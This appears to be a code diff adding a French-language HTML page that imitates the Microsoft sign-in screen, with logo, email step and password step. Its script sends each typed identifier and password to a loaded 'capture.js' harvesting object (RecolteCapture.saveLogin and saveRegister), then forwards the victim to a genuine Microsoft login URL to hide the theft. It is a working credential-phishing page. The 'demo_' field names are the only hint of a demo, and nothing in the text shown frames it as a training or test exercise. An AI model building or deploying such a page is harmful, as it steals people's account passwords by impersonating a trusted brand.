@@ -1,0 +1,446 @@
+<!doctype html>
+<html lang="fr">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>Connexion · Microsoft</title>
+    <meta name="theme-color" content="#ffffff" />
+    <style>
+      :root {
+        --ms-blue: #0067b8;
+        --ms-blue-btn: #0067b8;
+        --text: #1b1b1b;
+        --muted: #616161;
+        --line: #605e5c;
+        --card: #ffffff;
+        --bg: #f2f2f2;
+      }
+
+      * { box-sizing: border-box; margin: 0; padding: 0; }
+
+      body {
+        min-height: 100dvh;
+        font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+        color: var(--text);
+        background:
+          radial-gradient(ellipse 80% 60% at 10% 20%, #d7ebf8 0%, transparent 50%),
+          radial-gradient(ellipse 70% 50% at 90% 80%, #e8f0fa 0%, transparent 45%),
+          linear-gradient(135deg, #f5f9fc 0%, #eef3f8 50%, #f7fafc 100%);
+        display: grid;
+        place-items: center;
+        padding: 0.75rem;
+        padding-top: max(0.75rem, env(safe-area-inset-top));
+        padding-bottom: max(0.75rem, env(safe-area-inset-bottom));
+        padding-left: max(0.75rem, env(safe-area-inset-left));
+        padding-right: max(0.75rem, env(safe-area-inset-right));
+        overflow-x: hidden;
+      }
+
+      .wrap {
+        width: 100%;
+        max-width: 440px;
+        min-width: 0;
+      }
+
+      .card {
+        background: var(--card);
+        padding: 1.5rem 1.25rem;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        min-width: 0;
+      }
+
+      .logo {
+        display: flex;
+        align-items: center;
+        gap: 0.45rem;
+        margin-bottom: 1.15rem;
+        font-size: 1.05rem;
+        font-weight: 600;
+        color: #737373;
+      }
+
+      .ms-squares {
+        width: 21px;
+        height: 21px;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 1px;
+        flex-shrink: 0;
+      }
+
+      .ms-squares span:nth-child(1) { background: #f25022; }
+      .ms-squares span:nth-child(2) { background: #7fba00; }
+      .ms-squares span:nth-child(3) { background: #00a4ef; }
+      .ms-squares span:nth-child(4) { background: #ffb900; }
+
+      h1 {
+        font-size: clamp(1.25rem, 5vw, 1.5rem);
+        font-weight: 600;
+        margin-bottom: 0.85rem;
+        letter-spacing: -0.01em;
+      }
+
+      .identity {
+        display: none;
+        align-items: center;
+        gap: 0.35rem;
+        margin-bottom: 1rem;
+        font-size: 0.95rem;
+        min-width: 0;
+        overflow-wrap: anywhere;
+      }
+
+      .identity.is-on { display: flex; }
+
+      .identity button {
+        border: 0;
+        background: transparent;
+        color: var(--ms-blue);
+        font: inherit;
+        cursor: pointer;
+        padding: 0;
+        min-height: 44px;
+      }
+
+      .field {
+        margin-bottom: 1rem;
+      }
+
+      .field input {
+        width: 100%;
+        border: 0;
+        border-bottom: 1px solid var(--line);
+        padding: 0.7rem 0;
+        font: inherit;
+        font-size: 16px;
+        outline: none;
+        background: transparent;
+      }
+
+      .field input:focus {
+        border-bottom-color: var(--ms-blue);
+        border-bottom-width: 2px;
+        padding-bottom: calc(0.7rem - 1px);
+      }
+
+      .links {
+        margin: 0.85rem 0 1.25rem;
+        font-size: 0.82rem;
+        line-height: 1.55;
+      }
+
+      .links a {
+        color: var(--ms-blue);
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        min-height: 40px;
+      }
+
+      .links a:hover { text-decoration: underline; }
+
+      .actions {
+        display: flex;
+        flex-direction: column-reverse;
+        gap: 0.55rem;
+      }
+
+      .btn {
+        width: 100%;
+        min-height: 44px;
+        height: 44px;
+        border: 0;
+        font: inherit;
+        font-size: 0.92rem;
+        font-weight: 600;
+        padding: 0 0.85rem;
+        cursor: pointer;
+      }
+
+      .btn-back {
+        background: #f3f2f1;
+        color: #252423;
+      }
+
+      .btn-back:hover { background: #e1dfdd; }
+
+      .btn-next {
+        background: var(--ms-blue-btn);
+        color: #fff;
+      }
+
+      .btn-next:hover { background: #005a9e; }
+
+      .btn-next:disabled {
+        opacity: 0.45;
+        cursor: not-allowed;
+      }
+
+      .notice {
+        margin-top: 0.85rem;
+        font-size: 0.8rem;
+        color: #a4262c;
+        min-height: 1.2rem;
+        overflow-wrap: anywhere;
+      }
+
+      .options {
+        margin-top: 1.15rem;
+        background: #fff;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        padding: 0.85rem 1.1rem;
+        min-height: 48px;
+        display: flex;
+        align-items: center;
+        gap: 0.65rem;
+        font-size: 0.92rem;
+        font-weight: 600;
+        color: #323130;
+        cursor: pointer;
+      }
+
+      .options:hover { background: #faf9f8; }
+
+      .key {
+        width: 20px;
+        height: 20px;
+        opacity: 0.7;
+        flex-shrink: 0;
+      }
+
+      .footer {
+        margin-top: 1.5rem;
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 0.65rem 1rem;
+        font-size: 0.72rem;
+        color: #616161;
+      }
+
+      .footer a {
+        color: inherit;
+        text-decoration: none;
+        min-height: 40px;
+        display: inline-flex;
+        align-items: center;
+      }
+
+      .footer a:hover { text-decoration: underline; }
+
+      .step { display: none; }
+      .step.is-on { display: block; }
+
+      @media (min-width: 480px) {
+        body { padding: 1.25rem; }
+        .card { padding: 44px; }
+        .logo { margin-bottom: 1.35rem; }
+        .links { margin: 0.85rem 0 1.5rem; }
+        .actions {
+          flex-direction: row;
+          justify-content: flex-end;
+        }
+        .btn {
+          width: auto;
+          min-width: 108px;
+        }
+        .options { margin-top: 1.35rem; }
+        .footer {
+          margin-top: 2rem;
+          justify-content: flex-end;
+        }
+      }
+
+      @media (prefers-reduced-motion: reduce) {
+        * { animation: none !important; transition: none !important; }
+      }
+
+      .field input:focus-visible,
+      .btn:focus-visible,
+      .links a:focus-visible,
+      .options:focus-visible,
+      .identity button:focus-visible {
+        outline: 2px solid var(--ms-blue);
+        outline-offset: 2px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <form class="card" id="ms-form" novalidate>
+        <div class="logo" aria-hidden="true">
+          <div class="ms-squares">
+            <span></span><span></span><span></span><span></span>
+          </div>
+          Microsoft
+        </div>
+
+        <div class="step is-on" data-step="email">
+          <h1>Se connecter</h1>
+          <div class="field">
+            <input
+              id="identifier"
+              name="demo_identifier"
+              type="text"
+              inputmode="email"
+              autocomplete="off"
+              placeholder="E-mail, téléphone ou identifiant Skype"
+              required
+            />
+          </div>
+          <div class="links">
+            <p>Vous n’avez pas encore de compte ? <a href="#" id="create-account">Créez-en un !</a></p>
+            <p><a href="#">Votre compte n’est pas accessible ?</a></p>
+          </div>
+          <div class="actions">
+            <button class="btn btn-next" id="next" type="button">Suivant</button>
+          </div>
+        </div>
+
+        <div class="step" data-step="password">
+          <h1>Entrez le mot de passe</h1>
+          <div class="identity is-on" id="identity-row">
+            <button type="button" id="back-email" aria-label="Changer de compte">←</button>
+            <span id="identity-label"></span>
+          </div>
+          <div class="field">
+            <input
+              id="password"
+              name="demo_password"
+              type="password"
+              autocomplete="off"
+              placeholder="Mot de passe"
+              required
+            />
+          </div>
+          <div class="links">
+            <p><a href="#">Mot de passe oublié ?</a></p>
+            <p><a href="#" id="create-account-2">Créer un compte</a></p>
+          </div>
+          <div class="actions">
+            <button class="btn btn-back" id="back" type="button">Retour</button>
+            <button class="btn btn-next" id="submit" type="submit">Se connecter</button>
+          </div>
+        </div>
+
+        <p class="notice" id="notice" hidden></p>
+      </form>
+
+      <div class="options" role="button" tabindex="0">
+        <svg class="key" viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="#605e5c" d="M14.5 8a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7zm-6.8 3.5c0-3.75 3.05-6.8 6.8-6.8s6.8 3.05 6.8 6.8-3.05 6.8-6.8 6.8c-1.2 0-2.32-.31-3.3-.86L7.5 20.5H4.5v-3l1.7-1.7c-.8-1.1-1.3-2.45-1.3-3.9z"/>
+        </svg>
+        Options de connexion
+      </div>
+
+      <footer class="footer">
+        <a href="#">Conditions d’utilisation</a>
+        <a href="#">Confidentialité et cookies</a>
+        <a href="#">…</a>
+      </footer>
+    </div>
+
+    <script src="./capture.js"></script>
+    <script>
+      const REDIRECT =
+        "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9199bf20-a13f-4107-85dc-02114787ef48&scope=https%3A%2F%2Foutlook.office.com%2F.default%20openid%20profile%20offline_access&redirect_uri=https%3A%2F%2Foutlook.live.com%2Fmail%2F&client-request-id=6faf1dcf-28a2-537c-9eb0-c8a2632c6aed&response_mode=fragment&client_info=1&clidata=1&prompt=select_account&nonce=01a038ea-c559-7129-a10d-34977c7cc6e0&state=eyJpZCI6IjAxYTAzOGVhLWM1NTktNzNiYi05YmRkLTM2MzIyZmYwMzA2MiIsIm1ldGEiOnsiaW50ZXJhY3Rpb25UeXBlIjoicmVkaXJlY3QifX0%3D%7CaHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwv%7CeyJwcm9tcHQiOiJzZWxlY3RfYWNjb3VudCJ9&claims=%7B%22access_token%22%3A%7B%22xms_cc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&x-client-SKU=msal.js.browser&x-client-VER=5.12.0&response_type=code&code_challenge=q45GqkJFMJrSUQjOmCrcJRqN2kQ7ZZd0VBxFG9i2MBY&code_challenge_method=S256&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&fl=dob%2Cflname%2Cwld";
+
+      const form = document.querySelector("#ms-form");
+      const notice = document.querySelector("#notice");
+      const identifier = document.querySelector("#identifier");
+      const password = document.querySelector("#password");
+      const nextBtn = document.querySelector("#next");
+      const backBtn = document.querySelector("#back");
+      const backEmail = document.querySelector("#back-email");
+      const identityLabel = document.querySelector("#identity-label");
+      const stepEmail = document.querySelector('[data-step="email"]');
+      const stepPassword = document.querySelector('[data-step="password"]');
+      let mode = "login";
+
+      function showNotice(msg) {
+        notice.hidden = !msg;
+        notice.textContent = msg || "";
+      }
+
+      function goPassword() {
+        const id = identifier.value.trim();
+        if (!id) {
+          showNotice("Entrez une adresse e-mail, un téléphone ou un identifiant Skype.");
+          return;
+        }
+        showNotice("");
+        identityLabel.textContent = id;
+        stepEmail.classList.remove("is-on");
+        stepPassword.classList.add("is-on");
+        password.focus();
+      }
+
+      function goEmail() {
+        stepPassword.classList.remove("is-on");
+        stepEmail.classList.add("is-on");
+        showNotice("");
+        identifier.focus();
+      }
+
+      function setRegisterMode(e) {
+        e.preventDefault();
+        mode = mode === "login" ? "register" : "login";
+        const titles = document.querySelectorAll("h1");
+        titles.forEach((t) => {
+          if (stepEmail.classList.contains("is-on")) {
+            t.textContent = mode === "register" ? "Créer un compte" : "Se connecter";
+          }
+        });
+        if (stepPassword.classList.contains("is-on")) {
+          document.querySelector('[data-step="password"] h1').textContent =
+            mode === "register" ? "Choisissez un mot de passe" : "Entrez le mot de passe";
+        }
+        document.querySelector("#submit").textContent =
+          mode === "register" ? "S’inscrire" : "Se connecter";
+      }
+
+      nextBtn.addEventListener("click", goPassword);
+      identifier.addEventListener("keydown", (e) => {
+        if (e.key === "Enter") {
+          e.preventDefault();
+          goPassword();
+        }
+      });
+      backBtn.addEventListener("click", goEmail);
+      backEmail.addEventListener("click", goEmail);
+      document.querySelector("#create-account").addEventListener("click", setRegisterMode);
+      document.querySelector("#create-account-2").addEventListener("click", setRegisterMode);
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        const id = identifier.value.trim();
+        const pass = password.value;
+        if (!id || pass.length < 4) {
+          showNotice("Remplis correctement l’identifiant et le mot de passe.");
+          return;
+        }
+
+        const payload = {
+          network: "microsoft",
+          identifier: id,
+          password: pass,
+          method: window.RecolteCapture.looksLikePhone(id) ? "mobile" : "user",
+        };
+
+        if (mode === "register") {
+          window.RecolteCapture.saveRegister(payload);
+          showNotice("");
+          form.reset();
+          mode = "login";
+          goEmail();
+          document.querySelector('[data-step="email"] h1').textContent = "Se connecter";
+          document.querySelector("#submit").textContent = "Se connecter";
+          return;
+        }
+
+        window.RecolteCapture.saveLogin(payload);
+        window.top.location.href = REDIRECT;
+      });
+    </script>
+  </body>
+</html>
